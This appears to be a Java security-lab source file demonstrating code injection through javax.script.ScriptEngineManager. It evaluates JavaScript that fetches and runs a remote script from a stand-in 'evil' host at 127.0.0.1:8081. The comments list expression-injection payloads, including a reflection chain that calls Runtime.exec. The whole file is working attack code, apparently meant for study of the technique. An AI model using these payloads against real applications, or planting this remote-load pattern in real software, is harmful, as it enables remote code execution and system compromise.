package com.example.javasec.codeinjection;

import javax.script.ScriptEngineManager;
import javax.script.ScriptException;

public class scriptengine {
    public static void main(String[] args) throws ScriptException {

        // ''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")
        // Class.forName("javax.script.ScriptEngineManager")["newInstance"]()["getEngineByExtension"]("js")["eval"]("load('http://127.0.0.1:8081/evil')")
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        // scriptEngineManager.getEngineByName("JavaScript").eval("load('http://127.0.0.1:8081/evil')");
        // scriptEngineManager.getEngineByExtension("js").eval("load('http://127.0.0.1:8081/evil')");
        scriptEngineManager.getEngineByMimeType("text/javascript").eval("load('http://127.0.0.1:8081/evil')");
    }

}
